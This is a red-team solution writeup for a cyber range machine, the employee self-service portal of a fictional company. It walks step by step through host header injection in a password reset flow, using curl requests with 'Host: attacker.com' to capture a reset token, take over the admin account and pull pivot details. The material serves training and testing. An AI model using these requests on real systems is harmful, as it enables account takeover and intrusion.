# solve_red.md — M1 · itgw-webportal
## Red Team Solution Writeup
**Range:** RNG-IT-01 · Corporate Gateway  
**Machine:** M1 — Prabal Urja Limited Employee Self-Service Portal  
**Vulnerability:** HTTP Host Header Injection in Password Reset  
**MITRE ATT&CK:** T1078 (Valid Accounts) · T1565.001 (Stored Data Manipulation)  
**Severity:** High  
**Kill Chain Stage:** Exploitation → Installation

---

## Objective
Gain authenticated access to the PUL Employee Portal as the `admin` role user, then extract the internal mail relay infrastructure detail from the admin dashboard to proceed to M2.

---

## Environment
| Item | Value |
|---|---|
| Target IP | `203.0.x.x` (or as assigned) |
| Service Port | `8080` |
| Protocol | HTTP |
| Target Account | `admin@prabalurja.in` |

---

## Step-by-Step Exploitation

### Step 1 — Reconnaissance & Discovery

Identify the running web service:
```bash
nmap -sV -p 8080 203.x.x.x
curl -s -o /dev/null -w "%{http_code}" http://203.0.x.x:8080/
```
<img width="1309" height="468" alt="image" src="https://github.com/user-attachments/assets/b0d2ac89-eaca-4949-8195-7fb413a23581" />



Navigate to the portal. Observe the login page, the `Forgot Password` link, and note that password reset is implemented. This is the attack surface.

### Step 2 — Identify the Password Reset Mechanism

Browse to:

```
http://203.x.x.x:8080/forgot-password
```


<img width="2521" height="1375" alt="image" src="https://github.com/user-attachments/assets/45887396-7101-4b12-8a4c-ecb2821fc8c6" />


Inspect the form — it accepts an email address and POSTs to `/forgot-password`. Submit a test request using Burp Suite or curl. Observe the response: the application reflects the constructed reset URL in the response body.

### Step 3 — Host Header Injection

The vulnerability: the application uses `request.headers.get('Host')` to construct the password reset URL without any validation or whitelist check. Whatever is in the `Host` header gets embedded into the reset link.

**Craft the malicious request:**
```bash
curl -s -X POST http://203.x.x.x:8080/forgot-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=admin@prabalurja.in"
```
<img width="2559" height="1296" alt="image" src="https://github.com/user-attachments/assets/730b018d-c91b-4656-815f-493b707bf8bf" />

**Observe the response:**
```
Password reset instructions have been dispatched to admin@prabalurja.in.
Reset link: http://attacker.com/reset-password?token=<TOKEN_VALUE>
```
<img width="2559" height="1509" alt="image" src="https://github.com/user-attachments/assets/d1ece71a-fd47-49e2-b702-58c993bfacbc" />



The token is now visible in the response. In a real engagement, if the admin clicks this link, the GET request would reach the attacker's server. Here, the token is directly reflected.

### Step 4 — Extract the Token

Copy the full token value from the response. The token is a `secrets.token_urlsafe(48)` value — do not modify it.

Example token (yours will differ):
```
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_
```

### Step 5 — Use the Token to Reset the Admin Password

Navigate directly to the reset endpoint on the **actual server** using the extracted token:
```
http://203.0.x.x:8080/reset-password?token=<TOKEN_VALUE>
```

<img width="2559" height="1440" alt="image" src="https://github.com/user-attachments/assets/7cf9dc5b-0e03-401d-9570-bd86fa5f6fa8" />

Or via curl:
```bash
curl -s -X POST "http://203.x.x.x:8080/reset-password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=<TOKEN_VALUE>&new_password=Hacked@12345"
```

<img width="1345" height="769" alt="image" src="https://github.com/user-attachments/assets/d7ff6ac6-3a46-442b-8f53-67b8be184cd4" />


A success message confirms the password has been updated.

### Step 6 — Login as Admin

```bash
curl -s -c cookies.txt -X POST http://203.0.x.x:8080/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=admin@prabalurja.in&password=Hacked@12345"
```

Or log in via browser. The admin dashboard loads.

<img width="2522" height="1351" alt="image" src="https://github.com/user-attachments/assets/8be21cef-ae9f-4b06-81ed-ca3e04763ccb" />




### Step 7 — Extract Pivot Artifact

On the admin dashboard, the **IT Infrastructure — Administrative View** panel reveals:

| Field | Value |
|---|---|
| Mail Relay Host | `203.x.x.x/24` |
| Mail Relay Port | `25` |
| Auth | Not required (v-Public subnet) |

This is your pivot to **M2 — itgw-mailrelay**.

---

## Proof of Exploitation

Evidence to capture:
1. The curl request showing `Host: attacker.com` with the reflected token in response.
2. Screenshot of the admin dashboard showing `role: admin`.
3. The mail relay IP and port from the infrastructure panel.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Steal or Forge Authentication Certificates | T1649 |
| Privilege Escalation | Valid Accounts — Local Accounts | T1078.003 |

---

## Tools Used
- `curl` / Burp Suite (request manipulation)
- `nmap` (service discovery)
- Browser (dashboard access)
